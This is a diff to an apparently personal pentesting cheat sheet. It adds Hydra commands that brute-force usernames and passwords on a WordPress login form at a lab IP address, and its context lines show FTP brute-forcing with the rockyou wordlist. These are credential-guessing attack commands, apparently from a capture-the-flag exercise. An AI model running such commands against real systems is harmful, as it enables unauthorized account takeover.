@@ -15,6 +15,16 @@ hydra -l <username> -P <password list> <ip address> http-post-form <"/path/to/fo
 Also be sure to change out the username to ^USER^ and password to ^PASS^
 ```
 
+## HTTP-POST Brutefore Usernames
+```
+hydra -L sorted.dic -p pass 10.10.187.171 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:Invalid username" -t 35
+```
+
+## HTTP-POST Brutecforce Passwords
+```
+hydra -l elliot -P sorted.dic 10.10.187.171 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:The password you entered for the username" -t 35
+```
+
 ## FTP
 ```
 hydra -t 4 -l mike -P /usr/share/wordlists/rockyou.txt -vV 10.10.173.92 ftp
